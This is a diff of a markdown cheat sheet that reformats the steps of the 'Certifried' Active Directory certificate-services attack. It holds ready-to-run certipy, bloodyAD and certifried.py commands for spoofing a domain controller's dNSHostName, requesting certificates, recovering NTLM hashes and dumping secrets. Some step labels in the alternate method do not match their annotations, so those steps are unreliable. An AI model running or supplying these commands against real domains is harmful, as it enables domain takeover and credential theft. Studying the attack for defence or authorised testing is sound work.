@@ -4,7 +4,7 @@
 
 ## Enumeration
 
- - certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
+    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
 
 ### If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted.
 
@@ -12,35 +12,35 @@
 
 #### 1) Clearing the SPNs
 
- - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname
+    bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname
 
 #### 2) Setting the dNSHostName value to the name of a computer account to impersonate
 
- - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'
+    bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'
 
 #### 3) Verifying the dNSHostName value and SPN entries
 
- - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname
+    bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname
 
 #### 4) Adding a computer account and setting the dNSHostName to impersonate
 
- - certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"
+    certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"
 
 ## Alternate Method
 
 #### 1) Request certificate manually
 
- - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)
+    python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)
 
 #### 2) Recover NTLM Hash
 
- - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap (Request the certificate manually)
+    python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap (Request the certificate manually)
 
 ### Proceed with secretsdump
 
 #### 3) After obtaining the NTLM hash, proceed with dumping secrets
 
- - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump
+    python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump
 
 #### 4) Modify computer account
 
